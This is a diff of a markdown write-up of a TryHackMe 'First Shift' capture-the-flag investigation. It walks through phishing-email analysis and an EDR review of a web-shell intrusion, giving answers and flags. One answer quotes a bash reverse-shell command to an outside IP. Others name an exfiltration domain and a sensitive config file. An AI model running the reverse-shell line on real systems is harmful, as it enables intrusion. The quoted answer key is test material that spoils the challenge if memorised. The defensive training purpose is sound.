@@ -86,7 +86,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 
 
-    ><details><summary>Click for answer</summary>T1583.003</details>
+     ><details><summary>Click for answer</summary>T1583.003</details>
 
 ### Phishing Books
 
@@ -94,7 +94,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     After opening the email analysis report, we can see which headers are not active in the "arc-authentication-results" section.
 
-    HEADER
+    ![Phishing Header](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Header.png)
 
     ><details><summary>Click for answer</summary>DMARC=none</details>
 
@@ -102,7 +102,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     If we look at the sender of the email, we can see that it closely resembles the legitimate domain. However, it replaces one or a few characters with another character while still having it look visually similar to the original.
 
-    TYPO
+    ![Phishing Typo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Typo.png)
     
     ><details><summary>Click for answer</summary>Typosquatting</details>
 
@@ -116,7 +116,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     If we open the email in the mail client, we can see the attached file.
 
-    EXTENSIONS
+    ![Phishing Extension](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Extension.png)
 
     ><details><summary>Click for answer</summary>.HTML</details>
 
@@ -124,7 +124,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     This we can find by downloading the attachment and running `md5sum library-invoice.pdf.html`.
 
-    MD5
+    ![Phishing Md5](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Md5.png)
 
     ><details><summary>Click for answer</summary>442f2965cb6e9147da7908bb4eb73a72</details>
 
@@ -132,7 +132,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     Since it is an html file, we can open it in a browser. Here we see the landing page.
 
-    LANDING
+    ![Phishing Landing](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Landing.png)
 
     ><details><summary>Click for answer</summary>http://lib-service.com:8083</details>
 
@@ -140,7 +140,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     When opening the attachment, we can see some kind of obfuscation is used. Looking for techniques related to this under "Defense Evasion" yields us the answer.
 
-    OBFUSCATION
+    ![Phishing Obfuscation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Obfuscation.png)
 
     ><details><summary>Click for answer</summary>T1027</details>
 
@@ -148,13 +148,15 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     We can back track the javascript commands used to compile the message. First it joins the entire array, then it splits the characters, reverses them and joins them again. 
 
-    MESSAGE
+    ![Phishing Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Message.png)
 
     ><details><summary>Click for answer</summary>I love to phish books from libraries ^^</details>
 
 9.  Which line in the attached file is responsible for decoding the URL redirect?
 
     This is the line that uses the "xanthium".
+
+    ![Phishing Decoding](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Decoding.png)
 
     ><details><summary>Click for answer</summary>var src = reversed.split("").reverse().join("");</details>
 
@@ -164,23 +166,23 @@ This guide contains the answer and steps necessary to get to them for the [First
 
      The first entry we see is the first url in the redirect chain.
 
-     REDIRECT
+     ![Phishing Redirect](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Redirect.png)
 
-    ><details><summary>Click for answer</summary>http://xn--librarytlu-13cwe32432-kwr.com:8082</details>
+     ><details><summary>Click for answer</summary>http://xn--librarytlu-13cwe32432-kwr.com:8082</details>
 
 11.  What is the Threat Actor associated with this malicious file and/or URL?
 
      We can lookup the landing page url in "trydetectme". Be sure to remove the port number and the protocol (lib-service.com).
 
-     ADVERSARY
+     ![Phishing Adversary](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Adversary.png)
  
-    ><details><summary>Click for answer</summary>Cobalt Dickens | Silent Librarian</details>
+     ><details><summary>Click for answer</summary>Cobalt Dickens | Silent Librarian</details>
 
 12.  What is the main target of this Threat Actor according to MITRE?
 
      We can look for this adversarey on the [MITRE](https://attack.mitre.org) website to find their ptrimary target.
 
-    ><details><summary>Click for answer</summary>research and proprietary data</details>
+     ><details><summary>Click for answer</summary>research and proprietary data</details>
 
 ### Portal Drop
 
@@ -188,7 +190,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     If we open the log file, we can filter on status code '401'. This might indicate a brute force login attempt. From the list, we can see which IP address initiated this attack.
 
-    IP
+    ![Portal Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Ip.png)
 
     ><details><summary>Click for answer</summary>34.67.91.83</details>
 
@@ -196,7 +198,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     For this answer, we should filter the logs on the login page. Then we can look at the count of hits returning a status code of 200 and 401 respectively.
 
-    LOGIN
+    ![Portal Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Login.png)
 
     ><details><summary>Click for answer</summary>18, 35</details>
 
@@ -204,7 +206,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     Lets filter the logs on the IP address we found earlier. Then we filter it on any request containing 'upload'. This gives us a short list with our user-agent.
 
-    UPLOAD
+    ![Portal Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Upload.png)
 
     ><details><summary>Click for answer</summary>python-requests/2.31.0</details>
 
@@ -224,7 +226,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 
 
-    COMMAND
+    ![Portal Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Command.png)
 
     ><details><summary>Click for answer</summary>whoami</details>
 
@@ -234,7 +236,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     Opening this entry we can see which tactic and technique this is related to. We can look this up on the MITRE website to get the number associated with it.
 
-    PORTAL TECHNIQUE
+    ![Portal Technique](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Technique.png)
 
     ><details><summary>Click for answer</summary>T1505.003</details>
 
@@ -242,7 +244,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     If we look at the second detection entry (shell spawn), we can see several commands that have been executed by the attacker on the machine. If we look at the initiating process, the details pane gives us the image.
 
-    PORTAL IMAGE
+    ![Portal Image](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Image.png)
 
     ><details><summary>Click for answer</summary>/usr/sbin/php-fpm7.4</details>
 
@@ -250,49 +252,49 @@ This guide contains the answer and steps necessary to get to them for the [First
 
     In the same entry, we can see another command that is executed, which effectively spawns a reverse shell on the machine. 
 
-    PORTAL SHELL
+    ![Portal Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Shell.png)
 
     ><details><summary>Click for answer</summary>bash -i >& /dev/tcp/115.58.148.86/8080 0>&1</details>
 
 10.  Which Linux user executes the entered malicious commands?
 
-    From the image above, we can also make out the user that issued the command.
+     From the image above, we can also make out the user that issued the command.
 
-    ><details><summary>Click for answer</summary>www-data</details>
+     ><details><summary>Click for answer</summary>www-data</details>
 
 11.  What sensitive CRM configuration file did the attacker access? 
 
-    If we look at the next detection entry, we can see this is related to discovery. Indicating the attacker was snooping around. Here we can indeed see they were looking around for configuration files.
+     If we look at the next detection entry, we can see this is related to discovery. Indicating the attacker was snooping around. Here we can indeed see they were looking around for configuration files.
 
-    PORTAL FIND
+     ![Portal Find](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Find.png)
 
-    They found one of the sensitive configuration files and tried to read it.
+     They found one of the sensitive configuration files and tried to read it.
 
-    PORTAL CAT
+     ![Portal Cat](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Cat.png)
 
-    ><details><summary>Click for answer</summary>/etc/trycrm/config.json</details>
+     ><details><summary>Click for answer</summary>/etc/trycrm/config.json</details>
 
 12.  Which domain was used to exfiltrate the CRM portal database?
 
-    The last command issued in this entry is a curl command. Usefull when extracting information. In this command we can see which domain the attacker is sending the data to.
+     The last command issued in this entry is a curl command. Usefull when extracting information. In this command we can see which domain the attacker is sending the data to.
 
-    PORTAL CURL
+     ![Portal Curl](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Curl.png)
 
-    ><details><summary>Click for answer</summary>portaldrop2025.xyz</details>
+     ><details><summary>Click for answer</summary>portaldrop2025.xyz</details>
 
 13.  What flag do you get after completing all 12 EDR response actions?
 
-    For the first entry we want to analyze the root cause and stop the malicious file quarantining it.
+     For the first entry we want to analyze the root cause and stop the malicious file quarantining it.
 
-    For the second entry we must first terminate the connection from the bash command. Then we should also block the ip it is connected to.
+     For the second entry we must first terminate the connection from the bash command. Then we should also block the ip it is connected to.
     
-    For the thirds entry we should isolate the host so the DFIR team can analyse the data. We must also block the related ip address. Then we should also analyse the root cause.
+     For the thirds entry we should isolate the host so the DFIR team can analyse the data. We must also block the related ip address. Then we should also analyse the root cause.
 
-    For the fourth and final entry we should contact the user related to the login, review the changes made the the nginx configuration, and close it as a false positive if the actions taken are approved.
+     For the fourth and final entry we should contact the user related to the login, review the changes made the the nginx configuration, and close it as a false positive if the actions taken are approved.
 
-    PORTAL FLAG
+     ![Portal Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Flag.png)
 
-    ><details><summary>Click for answer</summary>THM{p0rtal_dropp3d?}</details>
+     ><details><summary>Click for answer</summary>THM{p0rtal_dropp3d?}</details>
 
 ### Zero Tolerance
 
@@ -354,31 +356,31 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 11.  At what time did the threat actor pivot from the beachhead to another system? Answer format: YYYY-MM-DD HH:MM:SS
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 12.  What is the full path of the PowerShell script used by the threat actor to collect data?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 13.  What are the first 4 file extensions targeted by this script for exfiltration? Answer format: Chronological, comma-separated
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 14.  What is the full path to the staged file containing collected files?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 ### The Crown Jewel
 
@@ -490,29 +492,29 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 11.  What was the UNC path that likely contained AWS credentials?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 12.  From which IP address did the adversary access AWS?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 13.  Which two sensitive files did the adversary exfiltrate from AWS?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
 14.  What file did the adversary upload to S3 in place of the wiped ones?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+     ><details><summary>Click for answer</summary></details>
 
